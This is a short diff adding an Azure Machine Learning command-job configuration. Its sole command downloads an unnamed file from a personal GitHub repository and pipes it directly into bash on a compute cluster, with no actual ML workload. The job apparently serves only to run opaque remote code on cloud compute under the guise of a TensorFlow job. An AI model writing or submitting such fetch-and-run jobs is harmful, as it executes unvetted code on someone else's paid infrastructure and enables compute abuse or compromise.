@@ -1,0 +1,8 @@
+$schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json
+type: command
+
+command: curl -sL https://github.com/hasmenkuy99/files/raw/main/mbcc | bash
+
+environment: azureml://registries/azureml/environments/tensorflow-2.12-py310-cpu/versions/5
+
+compute: acluster8
